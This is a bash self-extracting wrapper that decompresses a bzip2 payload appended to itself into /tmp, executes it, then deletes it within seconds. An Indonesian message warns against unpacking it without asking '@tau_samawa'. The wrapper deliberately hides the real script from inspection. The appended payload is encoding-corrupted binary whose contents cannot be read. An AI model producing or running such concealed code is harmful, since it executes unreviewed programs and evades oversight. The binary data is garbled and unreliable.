#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��� 3�}� �����������PT@   �P�=Ͷ��.6�M��%	�<S)�'�CD������M����2=F�(��( 	(�h4LF������ h� &� $�CJdji榚CCM���   F� Ɔ���h@�  i��   �E�O�$ҏO�=(ަ��)����6�j�=MP  �A	�(�EɊ�Tt��S��I�[�0�?.�����4�66\��O'z���wc�w�Ar�"���X�|����ӌ^mC	��i�����$N���~��^�>��M�!�gUy%����fc(�P��Q	�f�Ϊ��0G����L�c�@��ʘy��ӎ1��������$(m	��b��)�y�D�]��`d$~���\i��=�ph�-}(��^ǸP5����M6�P#�ڟj̺�0�&yѫu|v�
s�=-�7Z.Pγ�����Q4��",��`6+	 �������E\M����KN�e����ܞ�]%
�RWӒGy�"q4ȅ�;�w����7D�G%A
b�
���[�k���`*%�4#2�6��ᬮi
��
憷�n�
�q� �
�ѫ����L��,�D�ie3e*Ȟ5�Re���&C�s�0�	Y�8*8M�,z��j��o�d�.�lq�v��ioHX��n�����t���R�M�<^g��d���"^��!Ϋ� B{�Lv��=ط�z'�q*eU�[��Kt����d#��$�`H��&����jY�oS(Q�}{�[#$�>ﶍ(2Jf=,x����j+�c��v۝�wI��v��p��S�7��b�Vs��9n��=�|�}NKp�U@��0cG-�PZ�� @@߂�]!�H��;��p�.���� �y	��DT��	�����
�.i�kx���r���Ud�&G�t��-�;�+N�v�T���ύ��l�C���WZ@���̕��xi-Ǻ�.���]	\{�1�e,�C�fZ�ɧ��k�3Rm��7-y�u�aj�aAK�m2�6���M�⼌A��'͘͵��n�e�T���6K��1�V�Vt�U+o&��~�V�5��Z2�����W�Ge��߳"0�@X�ti���w*ț��`[|�@��@����F�[����(m�iD�1:�0�:v�Y��2kt�ᔁ��Av��f:�g��KiR9A4��G�%N���\�Ǣ�Y��pR�@�v�IBIR/V
w�I�F2�؋쳰�x�7�-��!�/2J'p��S�Ά��h0��+�A��Wh�rJ�;b��(.�
U*�iJ���i%
)�ZX�&Y}�u]�b$05j��8���'�����s&V	�0֦Rvt#��(N�E�R	'9���d��	E�z�oH�¬�9B��VcND��H|H��L�������S\�b�>}�ȉ��f�#�kPX)��t���ae�KE��'�8��ë���A]@$&	!t�B&$!0�.��$ 
�Lc?�w$S�		��� 